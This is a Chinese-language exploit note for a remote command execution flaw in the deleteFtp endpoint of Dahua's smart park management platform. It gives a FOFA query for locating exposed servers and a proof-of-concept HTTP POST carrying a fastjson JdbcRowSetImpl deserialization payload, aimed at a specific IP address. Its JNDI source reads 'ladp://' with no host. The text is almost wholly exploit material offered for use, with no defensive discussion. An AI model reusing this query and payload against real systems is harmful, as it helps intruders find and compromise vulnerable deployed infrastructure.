# 大华智慧园区综合管理平台 deleteFtp 接口远程命令执行漏洞

    ## fofa

```
body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\"" || body="/WPMS/asset/lib/json2.js"
```



## poc

```
POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
Host: 113.214.2.195:8443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 180

{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ladp://","autoCommit":true}}}
```
